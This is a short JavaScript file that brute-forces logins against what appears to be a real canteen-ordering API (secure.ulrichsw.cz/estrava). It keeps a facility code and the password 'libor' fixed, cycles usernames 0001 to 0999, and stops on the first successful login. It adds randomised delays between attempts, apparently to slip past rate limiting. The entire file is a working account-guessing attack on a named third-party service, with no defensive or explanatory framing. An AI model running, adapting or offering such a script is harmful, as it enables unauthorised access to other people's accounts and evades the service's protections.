const url = 'https://secure.ulrichsw.cz/estrava/api/?v=1&action=login';
const data = {
  deviceName: "WEB",
  kodzar: "0013",
  pass: "libor",
  username: "0000"
};

let number = 0
async function getData() {
  let options = {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {
      'Content-Type': 'application/json'
    }
  }
  let retData = null
  await fetch(url, options)
    .then(res => res.json())
    .then(res => retData = res);
  console.log(retData, options)
  if (!retData.error) {
    return true
  } else {
    return false
  }
};
async function main() {
  for (let i = 0; i < 1000; ++i) {
    number += 1;
    if (number < 10)
      data.username = "000" + number
    else if (number < 100)
      data.username = "00" + number
    else if (number < 1000)
      data.username = "0" + number
    else
      data.username = number
    if (await getData()) {
      i = 10000
      break
    }
    await sleep(900 + Math.random() * 200)
  }
}


function sleep(milliseconds) {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}
main() 